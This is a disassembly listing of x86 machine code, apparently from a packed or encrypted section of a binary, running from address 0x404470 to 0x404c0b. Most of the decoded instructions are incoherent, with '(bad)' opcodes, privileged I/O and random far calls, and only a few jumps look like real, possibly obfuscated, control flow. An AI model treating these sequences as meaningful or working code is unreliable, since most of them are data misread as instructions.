  404470:	in     al,0x58
  404472:	or     BYTE PTR [ebx],al
  404474:	mov    eax,0xb8f7f45f
  404479:	or     eax,0x54c8e4b
  40447e:	das    
  40447f:	shr    DWORD PTR [ebx-0xa7cfab0],1
  404485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404486:	loop   0x404468
  404488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40448a:	cmp    al,0xc8
  40448c:	jl     0x4044c5
  40448e:	stc    
  40448f:	push   ebp
  404490:	mov    eax,ds:0xe6891838
  404495:	push   esi
  404496:	sub    DWORD PTR [esi-0x28],0x71d01418
  40449d:	int3   
  40449e:	scas   eax,DWORD PTR es:[edi]
  40449f:	pusha  
  4044a0:	icebp  
  4044a1:	xchg   ebx,eax
  4044a2:	test   DWORD PTR [ecx],ebx
  4044a4:	cli    
  4044a5:	loope  0x40442f
  4044a7:	test   eax,0x531cc4bd
  4044ac:	mov    BYTE PTR [edi-0x20dae540],bh
  4044b2:	mov    cl,0xbd
  4044b4:	cmp    eax,0x3c7cdca1
  4044b9:	mov    eax,ds:0x4a3c1018
  4044be:	sub    al,0x28
  4044c0:	test   eax,0x3e431578
  4044c5:	xor    al,0xe7
  4044c7:	out    0xb,eax
  4044c9:	leave  
  4044ca:	add    BYTE PTR [edi],bl
  4044cc:	mov    ds:0xc043440,al
  4044d1:	add    ebx,DWORD PTR [ecx]
  4044d3:	repnz xor DWORD PTR [eax],edx
  4044d6:	inc    esp
  4044d7:	(bad)  
  4044d8:	or     al,0xd8
  4044da:	pop    ebp
  4044db:	mov    DWORD PTR [ebx],edi
  4044dd:	push   esp
  4044de:	int    0x2f
  4044e0:	mov    bl,0xa1
  4044e2:	jecxz  0x404554
  4044e4:	aas    
  4044e5:	in     al,dx
  4044e6:	stos   BYTE PTR es:[edi],al
  4044e7:	popf   
  4044e8:	or     cl,BYTE PTR [eax]
  4044ea:	pop    edx
  4044eb:	addr16 xchg esp,eax
  4044ed:	jno    0x40447f
  4044ef:	dec    ebx
  4044f0:	mov    ds:0xaa4c6f1a,al
  4044f5:	iret   
  4044f6:	cmp    al,0xf4
  4044f8:	pop    eax
  4044f9:	push   cs
  4044fa:	aas    
  4044fb:	(bad)  
  4044fc:	fidiv  DWORD PTR [ebp+0x6e8bcc6c]
  404502:	lods   eax,DWORD PTR ds:[esi]
  404503:	add    dl,BYTE PTR [esi]
  404505:	xchg   esi,eax
  404506:	mov    BYTE PTR [edx],dl
  404508:	and    ebp,DWORD PTR [esi+ecx*1-0x5eb494cd]
  40450f:	sub    DWORD PTR [ecx+esi*8+0x8],esp
  404513:	fs (bad) 
  404516:	imul   ebx,edi,0x81453e94
  40451c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40451d:	adc    DWORD PTR [edx+esi*4],0xfa0065be
  404524:	mov    ds:0x56a32d2e,eax
  404529:	imul   edi,ecx,0xa9f8b55e
  40452f:	shr    BYTE PTR [eax+0x1daede92],0x50
  404536:	adc    al,0x2e
  404538:	add    eax,0x70959d44
  40453d:	mov    BYTE PTR [ecx+0x3f436814],cl
  404543:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  404545:	xor    al,0x16
  404547:	cmp    DWORD PTR [bp+di+0x16],edx
  40454b:	outs   dx,DWORD PTR ds:[esi]
  40454c:	jbe    0x4045a1
  40454e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40454f:	add    DWORD PTR [ebx-0x6d],edx
  404552:	mov    cl,BYTE PTR [edx+esi*8-0x16]
  404556:	aam    0xcd
  404558:	sti    
  404559:	or     eax,0x5cc1e864
  40455e:	sub    eax,0xfbb23bcf
  404563:	ja     0x4045d5
  404565:	mov    ch,0xb8
  404567:	lock push ecx
  404569:	push   ss
  40456a:	repnz in al,dx
  40456c:	test   eax,0xaad6d6c0
  404571:	cmp    esp,DWORD PTR [edx-0x60002076]
  404577:	imul   ebp,DWORD PTR [ecx+0x27],0x40
  40457b:	push   cs
  40457c:	int3   
  40457d:	and    ecx,DWORD PTR [esi]
  40457f:	test   al,0xf7
  404581:	(bad)  
  404585:	push   edx
  404586:	mov    ds:0x2bb68976,al
  40458b:	ins    DWORD PTR es:[edi],dx
  40458c:	int3   
  40458d:	mov    eax,0x80b9e98d
  404592:	push   esi
  404593:	in     al,dx
  404594:	push   ebp
  404595:	adc    edx,DWORD PTR [eax+0x4291697a]
  40459b:	push   esi
  40459c:	mov    BYTE PTR [edx+0x68],bh
  40459f:	jo     0x4045e7
  4045a1:	mov    edi,0xa9e99ecd
  4045a6:	fwait
  4045a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a8:	nop
  4045a9:	ins    DWORD PTR es:[edi],dx
  4045aa:	pushf  
  4045ab:	jb     0x40458f
  4045ad:	lds    ebp,FWORD PTR [eax]
  4045af:	or     dl,dl
  4045b1:	xor    bl,ah
  4045b3:	std    
  4045b4:	xlat   BYTE PTR ds:[ebx]
  4045b5:	fild   WORD PTR [edi-0x3d]
  4045b9:	jns    0x4045b9
  4045bb:	cld    
  4045bc:	mov    ds:0x3370c278,eax
  4045c1:	leave  
  4045c2:	adc    bl,BYTE PTR ds:0xbf2ec135
  4045c8:	jg     0x4045d6
  4045ca:	lods   al,BYTE PTR ds:[esi]
  4045cb:	add    esp,esi
  4045cd:	mov    ds:0xfccf02b9,eax
  4045d2:	icebp  
  4045d3:	sub    eax,0x7bed6b57
  4045d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d9:	leave  
  4045da:	sti    
  4045db:	push   esp
  4045dc:	vsubpd ymm1,ymm6,YMMWORD PTR [ecx+edx*1+0x40]
  4045e2:	aam    0x13
  4045e4:	(bad)  
  4045e5:	call   0x891e:0xc86ca80
  4045ec:	pop    es
  4045ed:	adc    DWORD PTR [esi-0x58],eax
  4045f0:	pop    ds
  4045f1:	push   ecx
  4045f2:	or     eax,0x8de2a905
  4045f7:	and    eax,0xc3e3e04
  4045fc:	(bad)  
  4045fd:	fistp  WORD PTR [eax-0x3b]
  404600:	dec    eax
  404601:	dec    esp
  404602:	adc    BYTE PTR [edx-0x7b5f928c],dl
  404608:	mov    ds:0x5c8e1511,eax
  40460d:	outs   dx,BYTE PTR ds:[esi]
  40460e:	push   edx
  40460f:	ret    0x6fa3
  404612:	add    dh,BYTE PTR [eax]
  404614:	cmp    BYTE PTR [esi+0x4fa5d630],ch
  40461a:	loopne 0x404602
  40461c:	in     eax,dx
  40461d:	dec    ecx
  40461e:	int    0x94
  404620:	xchg   ebp,eax
  404621:	outs   dx,BYTE PTR ds:[esi]
  404622:	pushf  
  404623:	or     BYTE PTR [ecx],dh
  404625:	adc    ebp,edx
  404627:	push   cs
  404628:	sbb    dh,BYTE PTR [esi]
  40462a:	push   ebp
  40462b:	and    BYTE PTR es:[ebx+0x163d2398],ah
  404632:	dec    dl
  404634:	inc    edi
  404635:	daa    
  404636:	mov    esp,0x1dd5d825
  40463b:	cmp    al,0x8b
  40463d:	das    
  40463e:	jno    0x40465a
  404640:	lds    edx,FWORD PTR [edx+0x31]
  404643:	pop    ebp
  404644:	push   ebp
  404645:	int    0x1
  404647:	(bad)  
  404648:	call   0xe124:0xf67123f8
  40464f:	mov    ds:0xfadc968a,al
  404654:	pop    esp
  404655:	lods   eax,DWORD PTR ds:[esi]
  404656:	dec    edi
  404657:	stos   BYTE PTR es:[edi],al
  404658:	xchg   ebx,eax
  404659:	sti    
  40465a:	imul   edx,DWORD PTR [eax+0x79],0xa303b769
  404661:	xor    eax,0x7e45f51b
  404666:	shr    bl,cl
  404668:	and    eax,0x34a2a3af
  40466d:	and    ebx,DWORD PTR [ecx]
  40466f:	pop    ebx
  404670:	fistp  WORD PTR [ecx-0x4634e1d3]
  404676:	xchg   ebx,eax
  404677:	mov    dl,BYTE PTR [esi+0x79]
  40467a:	xchg   esi,eax
  40467b:	xor    dh,bl
  40467d:	and    eax,0x877db909
  404682:	retf   0xb79d
  404685:	add    bh,BYTE PTR [edi+edx*2+0x6c]
  404689:	test   eax,0x2bfa965e
  40468e:	ror    BYTE PTR [edx+ebp*1],1
  404691:	sbb    eax,0xe24a66ff
  404696:	inc    esi
  404697:	cwde   
  404698:	cli    
  404699:	jecxz  0x4046c8
  40469b:	call   0x2194:0x640c4cf3
  4046a2:	push   edx
  4046a3:	inc    esi
  4046a4:	adc    eax,0x8061012e
  4046a9:	jne    0x4046cc
  4046ab:	aad    0xde
  4046ad:	aad    0x23
  4046af:	xor    eax,0xfcc192c6
  4046b4:	dec    eax
  4046b5:	(bad)  
  4046b6:	(bad)  
  4046b7:	xchg   edx,eax
  4046b8:	(bad)  
  4046b9:	pop    ebp
  4046ba:	ins    BYTE PTR es:[edi],dx
  4046bb:	les    esp,FWORD PTR [ebx+0x7f]
  4046be:	pop    esp
  4046bf:	xchg   ebx,eax
  4046c0:	sub    BYTE PTR [eax-0x6f],bl
  4046c3:	arpl   bx,bx
  4046c5:	dec    ecx
  4046c6:	xor    esi,DWORD PTR [eax+0x58b337f9]
  4046cc:	push   ds
  4046cd:	jnp    0x4046df
  4046cf:	scas   al,BYTE PTR es:[edi]
  4046d0:	leave  
  4046d1:	add    ecx,DWORD PTR [esp+ebx*1]
  4046d4:	std    
  4046d5:	mov    ds:0x7400d79f,eax
  4046da:	sub    al,0x7c
  4046dc:	mov    al,0x74
  4046de:	adc    al,0xf2
  4046e0:	fist   WORD PTR [bx+0x74]
  4046e4:	jne    0x4046d8
  4046e6:	fiadd  DWORD PTR [eax+0x3b]
  4046e9:	push   ecx
  4046ea:	(bad)  
  4046ec:	test   eax,0x250ebf54
  4046f1:	out    dx,al
  4046f2:	push   0x4a2fb21b
  4046f7:	or     al,0x45
  4046fa:	data16 out dx,al
  4046fc:	ret    0xa121
  4046ff:	neg    DWORD PTR [esi+0x12]
  404702:	icebp  
  404703:	mov    dh,0x8c
  404705:	sub    al,0x44
  404707:	fld    TBYTE PTR [eax-0x42d68eba]
  40470d:	push   ss
  40470e:	push   0x7
  404710:	xor    ebx,ebx
  404712:	or     esi,DWORD PTR [ecx]
  404714:	cmp    edx,DWORD PTR [ecx-0x5815fa07]
  40471a:	pop    ss
  40471b:	scas   eax,DWORD PTR es:[edi]
  40471c:	pop    es
  40471d:	add    DWORD PTR [ebx+0x19c26b12],edi
  404723:	cmp    edi,DWORD PTR [edx+0x63]
  404726:	add    cl,BYTE PTR [ebp+0x25]
  404729:	cmp    eax,0x1665e08e
  40472e:	sub    eax,0xeb071d42
  404733:	jb     0x40471a
  404735:	ds pop ebx
  404737:	add    al,0x20
  404739:	mov    edx,0xac0fc0a4
  40473e:	rol    DWORD PTR [edx],1
  404740:	or     DWORD PTR ds:0x4282a3,0x42825f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x42827f
  404753:	or     DWORD PTR ds:0x42837f,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0xbca542b6
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [ecx-0x47],cl
  40477b:	ds loope 0x404752
  40477e:	hlt    
  40477f:	es sub dh,0x13
  404783:	loop   0x4047fd
  404785:	jns    0x4047fe
  404787:	cmp    eax,DWORD PTR [bx+si]
  40478a:	gs add al,0xfb
  40478d:	cmp    BYTE PTR [eax],dl
  40478f:	mov    ds:0xc05a8c24,al
  404794:	inc    DWORD PTR [ecx+0x37]
  404797:	adc    eax,0xa4948f1e
  40479c:	xor    al,0x51
  40479e:	or     esi,esp
  4047a0:	cmp    al,0xcd
  4047a2:	fwait
  4047a3:	adc    ebx,DWORD PTR [eax-0x1464c302]
  4047a9:	push   ebx
  4047aa:	(bad)  
  4047ab:	push   esp
  4047ac:	jp     0x404785
  4047ae:	cmp    eax,0x11e800f8
  4047b3:	dec    eax
  4047b4:	rol    BYTE PTR [eax+ecx*8-0x6a],cl
  4047b8:	adc    bl,BYTE PTR [edx]
  4047ba:	jle    0x404744
  4047bc:	out    0x22,al
  4047be:	jae    0x4047ce
  4047c0:	mov    ah,0x1b
  4047c2:	cld    
  4047c3:	push   ebx
  4047c4:	ficomp DWORD PTR [ebx]
  4047c6:	dec    edi
  4047c7:	xchg   ebp,eax
  4047c8:	daa    
  4047c9:	adc    BYTE PTR [ebp+0x75aaf08f],al
  4047cf:	scas   eax,DWORD PTR es:[edi]
  4047d0:	push   edx
  4047d1:	adc    al,0xad
  4047d3:	mov    ch,0x33
  4047d5:	inc    edx
  4047d6:	ins    DWORD PTR es:[edi],dx
  4047d7:	push   eax
  4047d8:	retf   
  4047d9:	inc    ecx
  4047da:	rol    BYTE PTR [esi+0x4b628f1f],0xc5
  4047e1:	mov    ebx,0x628c70af
  4047e6:	scas   eax,DWORD PTR es:[edi]
  4047e7:	jb     0x4047a5
  4047e9:	bnd jno 0x40477f
  4047ec:	clc    
  4047ed:	xchg   BYTE PTR [ebp-0x41045bbe],bh
  4047f3:	retf   
  4047f4:	ror    BYTE PTR [ebp-0x68635959],1
  4047fa:	cs mov bh,0x52
  4047fd:	sbb    ebp,DWORD PTR [ecx+0x79]
  404800:	or     bh,dh
  404802:	lock push cs
  404804:	jg     0x4047ed
  404806:	les    ebp,FWORD PTR [esi+0x33]
  404809:	push   ebx
  40480a:	imul   ecx,DWORD PTR cs:[edx-0x1bd8cb7c],0x5b
  404812:	inc    edi
  404813:	or     al,0x73
  404815:	pop    es
  404816:	and    bh,ah
  404818:	push   eax
  404819:	mov    ch,0x70
  40481b:	adc    cl,BYTE PTR [eax]
  40481d:	popa   
  40481e:	rcl    BYTE PTR [ebx+eiz*2-0x73],cl
  404822:	ficom  DWORD PTR [esi]
  404824:	(bad)  
  404825:	sbb    eax,0xf48386ca
  40482a:	mov    BYTE PTR ss:[edx],0xd1
  40482e:	cmp    eax,0x3e45c4c
  404833:	mov    ecx,DWORD PTR [ecx]
  404835:	pop    esp
  404836:	int    0x23
  404838:	mov    DWORD PTR [edi+0x5566c9df],edi
  40483e:	push   eax
  40483f:	sub    DWORD PTR [ebx-0x75],0xe4a15049
  404846:	push   0x74
  404848:	dec    esi
  404849:	adc    al,0x47
  40484b:	inc    esp
  40484c:	shr    BYTE PTR [bp+di+0x4ba],cl
  404851:	xchg   edx,eax
  404852:	sbb    BYTE PTR [eax+ecx*4],dh
  404855:	or     eax,0x45e7b50a
  40485a:	aaa    
  40485b:	pop    es
  40485c:	lods   al,BYTE PTR ds:[esi]
  40485d:	jp     0x40488d
  40485f:	jmp    0x3ffd:0xcb42ff0b
  404866:	loop   0x4048d6
  404868:	xchg   ecx,eax
  404869:	sbb    eax,0xc45ca5f8
  40486e:	sbb    bh,BYTE PTR [ebp+0x68ac207e]
  404874:	jno    0x404832
  404876:	cmove  ebx,DWORD PTR [esi+ebx*4-0xa]
  40487b:	idiv   DWORD PTR [ecx-0x4f]
  40487e:	das    
  40487f:	pushf  
  404880:	das    
  404881:	push   ebp
  404882:	fwait
  404883:	xchg   ecx,eax
  404884:	mov    cl,0x3c
  404886:	dec    edx
  404887:	aad    0xb1
  404889:	jmp    0x40481c
  40488b:	or     DWORD PTR [edi+edi*1],ebp
  40488e:	out    0x9,eax
  404890:	adc    BYTE PTR [esi-0x71],dl
  404893:	sub    ecx,ebp
  404895:	lods   eax,DWORD PTR ds:[esi]
  404896:	sbb    BYTE PTR [edi+0x1b3316ef],cl
  40489c:	inc    eax
  40489d:	bound  esi,QWORD PTR [ebp+0x51]
  4048a0:	fisttp WORD PTR [bp+si-0x7db8]
  4048a5:	les    esp,FWORD PTR [edi]
  4048a7:	xor    al,0xe9
  4048a9:	cmp    bl,bh
  4048ab:	in     al,0x3a
  4048ad:	cmp    eax,0x2f5c0c9d
  4048b2:	test   BYTE PTR [esi],cl
  4048b4:	(bad)  
  4048b5:	mov    dh,0x72
  4048b7:	ror    DWORD PTR [ebp-0x74],0x8f
  4048bb:	jmp    0x2eb34807
  4048c0:	test   BYTE PTR [edi-0x79],0x3b
  4048c4:	adc    DWORD PTR [ebx+0x20],ebp
  4048c7:	mov    bl,0x73
  4048c9:	pop    es
  4048ca:	arpl   WORD PTR [esi-0x69],dx
  4048cd:	mov    ds:0xf5f3b77f,al
  4048d2:	mov    ecx,0x8a97259b
  4048d7:	dec    esi
  4048d8:	clc    
  4048d9:	sar    BYTE PTR [edi],cl
  4048db:	push   ebp
  4048dc:	aad    0x2e
  4048de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048df:	push   ebp
  4048e1:	je     0x404884
  4048e3:	outs   dx,BYTE PTR ds:[esi]
  4048e4:	test   DWORD PTR [eax+0x4e],eax
  4048e7:	fimul  DWORD PTR [ebx+0x5b]
  4048ea:	mov    bl,BYTE PTR [ebx+ebp*8+0x6f73c81f]
  4048f1:	adc    ch,BYTE PTR [ecx]
  4048f3:	in     al,0xa5
  4048f5:	outs   dx,DWORD PTR ds:[esi]
  4048f6:	mov    bl,0x74
  4048f8:	and    bl,bh
  4048fa:	push   eax
  4048fb:	jo     0x40492a
  4048fd:	or     DWORD PTR [edi-0x39],esp
  404900:	cmc    
  404901:	and    al,0x1c
  404903:	add    al,0x19
  404905:	mov    esi,0x28f4caf2
  40490a:	pop    edi
  40490b:	lahf   
  40490c:	aam    0xad
  40490e:	imul   ebx,esi,0x22
  404911:	popf   
  404912:	(bad)  
  404913:	ins    DWORD PTR es:[edi],dx
  404914:	jg     0x40489f
  404916:	xor    al,0x22
  404918:	push   edx
  404919:	dec    ecx
  40491a:	sbb    DWORD PTR [eax-0x1bd418a5],esi
  404920:	ror    DWORD PTR [ebx-0x6],0xe3
  404924:	(bad)  
  404925:	jge    0x4048af
  404927:	ja     0x40499b
  404929:	and    bh,bl
  40492b:	and    BYTE PTR ds:0x857d7864,bh
  404931:	repz sbb eax,ecx
  404934:	or     edx,DWORD PTR [edx-0x1e]
  404937:	lahf   
  404938:	dec    ecx
  404939:	icebp  
  40493a:	mov    esi,0xb9f90f6e
  40493f:	or     al,0x7
  404941:	push   es
  404942:	(bad)  
  404943:	mov    cl,0x7c
  404945:	test   eax,0x1e1f730
  40494a:	clc    
  40494b:	mov    edx,0x7489f1b2
  404950:	imul   ax,WORD PTR [edi+0x59],0x2bff
  404956:	fcomp  DWORD PTR [ebp+0x65ec088c]
  40495c:	or     edx,esi
  40495e:	xchg   DWORD PTR [ebx+0x6382929d],esp
  404964:	data16 mov ah,0x0
  404967:	dec    edi
  404968:	push   0xb795f901
  40496d:	push   esi
  40496e:	jnp    0x40494e
  404970:	shl    BYTE PTR [ecx],cl
  404972:	rcr    BYTE PTR [edi-0x2373ade6],0xb6
  404979:	out    dx,eax
  40497a:	bound  ecx,QWORD PTR [esi-0x6a379a6e]
  404980:	sub    DWORD PTR [ebp+0x2a],edx
  404983:	cmp    cl,dh
  404985:	das    
  404986:	push   ds
  404987:	scas   eax,DWORD PTR es:[edi]
  404988:	cmp    al,0xad
  40498a:	or     ebx,ecx
  40498c:	sub    edi,DWORD PTR [edx]
  40498e:	cld    
  40498f:	and    eax,0xd343b96d
  404994:	es repz mov cl,0x3a
  404998:	xchg   edi,eax
  404999:	cmc    
  40499a:	clc    
  40499b:	dec    esp
  40499c:	push   ecx
  40499d:	xchg   edi,eax
  40499e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40499f:	std    
  4049a0:	xchg   ebp,eax
  4049a1:	pop    edi
  4049a2:	pop    ebp
  4049a3:	(bad)  
  4049a4:	test   ecx,0xabb7edca
  4049aa:	jae    0x404a0d
  4049ac:	pop    ebx
  4049ad:	mov    cl,ch
  4049af:	sub    al,BYTE PTR [eax-0x70]
  4049b2:	and    DWORD PTR [ebx+0x65374c74],eax
  4049b8:	out    dx,al
  4049b9:	mov    eax,0x83b5cfb
  4049be:	xor    DWORD PTR [ebx+edx*1+0x5c],ebx
  4049c2:	arpl   WORD PTR [ebx+esi*1-0x62740123],cx
  4049c9:	mov    ebp,0x9808f482
  4049ce:	cdq    
  4049cf:	xchg   DWORD PTR [ebx-0x20],esp
  4049d2:	inc    edx
  4049d3:	sub    BYTE PTR [edx],0x64
  4049d6:	mov    DWORD PTR [eax-0x595c4d91],0x27377c45
  4049e0:	xchg   BYTE PTR [edi],dl
  4049e2:	icebp  
  4049e3:	lahf   
  4049e4:	fwait
  4049e5:	mov    bh,0x91
  4049e7:	hlt    
  4049e8:	xchg   ebx,eax
  4049e9:	dec    ecx
  4049ea:	inc    esp
  4049eb:	ins    DWORD PTR es:[edi],dx
  4049ec:	inc    esi
  4049ed:	mov    esp,0x3fb1d700
  4049f2:	or     al,0x60
  4049f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049f5:	xor    BYTE PTR [esi-0xd],bl
  4049f8:	mov    ecx,0x5eb3e57c
  4049fd:	fcomp  st(0)
  4049ff:	lods   eax,DWORD PTR ds:[esi]
  404a00:	adc    ecx,eax
  404a02:	jns    0x4049ce
  404a04:	stos   BYTE PTR es:[edi],al
  404a05:	cli    
  404a06:	adc    esp,ecx
  404a08:	mov    edi,0x720fbaf6
  404a0d:	dec    ebp
  404a0e:	add    DWORD PTR [ebx],ecx
  404a10:	dec    esp
  404a11:	sbb    dh,cl
  404a13:	mov    DWORD PTR [eax],eax
  404a15:	(bad)  
  404a16:	mov    cl,0x8b
  404a18:	fsincos 
  404a1a:	pop    ebx
  404a1b:	(bad)  
  404a1c:	push   ebp
  404a1d:	mov    WORD PTR [ecx+ebp*1-0x740832e5],gs
  404a24:	xlat   BYTE PTR ds:[ebx]
  404a25:	stos   DWORD PTR es:[edi],eax
  404a26:	and    eax,0xc3513594
  404a2b:	push   edi
  404a2c:	stc    
  404a2d:	cli    
  404a2e:	sti    
  404a2f:	ds ss dec ebx
  404a32:	cmc    
  404a33:	xchg   ecx,eax
  404a34:	mov    WORD PTR [edx],fs
  404a36:	cmp    edi,esi
  404a38:	sbb    dh,BYTE PTR [ecx]
  404a3a:	pop    ds
  404a3b:	lods   eax,DWORD PTR ds:[esi]
  404a3c:	mov    ds:0xfa1eedd2,eax
  404a41:	push   es
  404a42:	push   eax
  404a43:	jne    0x404ac2
  404a45:	mov    esp,0xba0f4b5a
  404a4a:	push   edi
  404a4b:	cld    
  404a4c:	jle    0x404a1f
  404a4e:	push   ecx
  404a50:	mul    esp
  404a52:	and    al,0x39
  404a54:	icebp  
  404a55:	dec    ebp
  404a56:	ror    DWORD PTR [ebx+0x42],cl
  404a59:	test   al,0x3b
  404a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a5c:	jmp    0x514e8341
  404a61:	mov    ah,0x5
  404a63:	popf   
  404a64:	mov    ecx,0x61ebd09
  404a69:	imul   ebp,ecx,0x6b
  404a6c:	sub    eax,0x3942b8ee
  404a71:	rol    BYTE PTR [eax+0x7b],cl
  404a74:	push   edi
  404a75:	inc    eax
  404a76:	mov    al,ds:0x399ef78f
  404a7b:	mov    ecx,0x56b67f97
  404a80:	cmp    bl,BYTE PTR [ebp+0x947d9ae]
  404a86:	dec    ebx
  404a87:	clc    
  404a88:	jno    0x404a2f
  404a8a:	cdq    
  404a8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a8c:	fs mov ebp,0x818c83a0
  404a92:	sbb    al,0xef
  404a94:	mov    DWORD PTR [ebx],edx
  404a96:	adc    BYTE PTR [esi],bh
  404a98:	int3   
  404a99:	dec    esi
  404a9a:	pop    edx
  404a9b:	std    
  404a9c:	sbb    BYTE PTR [ebp-0x7a],dh
  404a9f:	add    al,0xcd
  404aa1:	mov    BYTE PTR [edi+ebx*1-0x64],ah
  404aa5:	test   al,0xab
  404aa7:	sbb    eax,0x7b0c449a
  404aac:	repnz xor BYTE PTR es:[esi-0x4d],0x6b
  404ab2:	mov    ebp,0xb316a805
  404ab7:	adc    eax,0x2c63dd48
  404abc:	xchg   al,dl
  404abe:	adc    DWORD PTR [eax+0x535287e6],eax
  404ac4:	xchg   edi,eax
  404ac5:	jo     0x404af3
  404ac7:	xor    al,BYTE PTR [ecx]
  404ac9:	retf   
  404aca:	push   cs
  404acb:	sub    eax,0x783f542f
  404ad0:	test   esi,esp
  404ad2:	mov    ecx,DWORD PTR [ecx]
  404ad4:	pop    esp
  404ad5:	and    eax,0x5bf04ac2
  404ada:	outs   dx,DWORD PTR ds:[esi]
  404adb:	ror    BYTE PTR [esi-0x20],1
  404ade:	adc    eax,0x99461095
  404ae3:	cmp    eax,0xefac01aa
  404ae8:	in     al,dx
  404ae9:	adc    al,0x5
  404aeb:	push   edi
  404aec:	adc    BYTE PTR [eax-0x67d7e13e],cl
  404af2:	ins    BYTE PTR es:[edi],dx
  404af3:	ds in  al,dx
  404af5:	aas    
  404af6:	lahf   
  404af7:	dec    ebp
  404af8:	repz cmp BYTE PTR [esi],al
  404afb:	repnz int3 
  404afd:	xabort 0x1c
  404b00:	sub    al,0x60
  404b02:	push   ss
  404b03:	add    DWORD PTR [esi],eax
  404b05:	jg     0x404ad2
  404b07:	or     edi,ecx
  404b09:	sti    
  404b0a:	rol    BYTE PTR [edx-0x2c],cl
  404b0d:	fs push eax
  404b0f:	cmc    
  404b10:	fistp  QWORD PTR [ebx-0x89d48b5]
  404b16:	pop    edi
  404b17:	pusha  
  404b18:	add    edx,DWORD PTR [esi-0x3d776acc]
  404b1e:	jl     0x404b3a
  404b20:	jnp    0x404ac5
  404b22:	leave  
  404b23:	pusha  
  404b24:	sahf   
  404b25:	fnsave [ebx-0x2c]
  404b28:	xor    eax,0x2860e88e
  404b2d:	in     eax,dx
  404b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b2f:	loopne 0x404b84
  404b31:	outs   dx,DWORD PTR ds:[esi]
  404b32:	dec    esp
  404b33:	xor    ch,BYTE PTR [esi-0x51e96e1c]
  404b39:	xchg   edx,eax
  404b3a:	mov    ecx,DWORD PTR [ebx]
  404b3c:	mov    edx,DWORD PTR [ebx+0x4]
  404b3f:	xor    DWORD PTR [ebp-0x1c],edi
  404b42:	add    DWORD PTR ds:0x428293,0x428307
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	das    
  404b60:	(bad)  
  404b61:	add    BYTE PTR [esi+0x1818c160],bh
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    BYTE PTR [ecx],ch
  404b6c:	jecxz  0x404b1f
  404b6e:	clc    
  404b6f:	jb     0x404ba5
  404b71:	outs   dx,DWORD PTR ds:[esi]
  404b72:	jno    0x404bad
  404b74:	push   esp
  404b75:	fs xor eax,0x7f060f26
  404b7b:	repz push 0x6a
  404b7e:	mov    dl,0xba
  404b80:	mov    edi,ecx
  404b82:	push   es
  404b83:	test   eax,0x263920ce
  404b88:	jno    0x404ba6
  404b8a:	mov    cl,0xa6
  404b8c:	dec    ebp
  404b8d:	sbb    al,0x7b
  404b8f:	push   eax
  404b90:	and    BYTE PTR [edx-0x31f8f780],bh
  404b96:	mov    BYTE PTR [ebx-0x6cf378bc],dh
  404b9c:	inc    edi
  404b9d:	adc    al,0xc
  404b9f:	pop    ecx
  404ba0:	xchg   BYTE PTR [edx+0x1ad473a2],al
  404ba6:	push   ss
  404ba7:	adc    al,0xcc
  404ba9:	shl    eax,0x9d
  404bac:	neg    DWORD PTR [ebx-0x45]
  404baf:	hlt    
  404bb0:	ja     0x404bd2
  404bb2:	adc    cl,BYTE PTR [edx+0x3d]
  404bb5:	pop    ecx
  404bb6:	aad    0x4e
  404bb8:	cmp    eax,0xe2a16b0f
  404bbd:	add    al,bh
  404bbf:	jb     0x404c30
  404bc1:	sub    BYTE PTR [ecx-0x4a],0x47
  404bc5:	out    dx,al
  404bc6:	scas   al,BYTE PTR es:[edi]
  404bc7:	add    DWORD PTR [ebx-0x55],ebx
  404bca:	inc    edx
  404bcb:	(bad)  
  404bcc:	xor    edx,DWORD PTR [ecx*1-0x158517bf]
  404bd3:	pop    ebx
  404bd4:	leave  
  404bd5:	pop    esi
  404bd6:	or     edx,DWORD PTR [edi+0x9]
  404bd9:	ror    DWORD PTR [edx],0x3f
  404bdc:	mov    ah,0x97
  404bde:	lds    ebx,FWORD PTR [edx]
  404be0:	inc    edi
  404be1:	pop    esi
  404be2:	pop    ds
  404be3:	ss add al,0x96
  404be6:	xor    eax,DWORD PTR [ebx]
  404be8:	lahf   
  404be9:	stos   DWORD PTR es:[edi],eax
  404bea:	xchg   ebx,eax
  404beb:	pop    ecx
  404bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bed:	shr    DWORD PTR [ecx-0x45],0x96
  404bf1:	mov    al,0xa0
  404bf3:	push   DWORD PTR [edi-0x4af9d6b8]
  404bf9:	dec    edx
  404bfa:	mov    cl,0xde
  404bfc:	gs mov bh,0x86
  404bff:	jae    0x404bb8
  404c01:	daa    
  404c02:	mov    ds,WORD PTR [esi]
  404c04:	adc    esp,edx
  404c06:	pop    eax
  404c07:	fisttp WORD PTR [ebx]
  404c09:	jns    0x404c5f
  404c0b:	xchg   ebp,eax
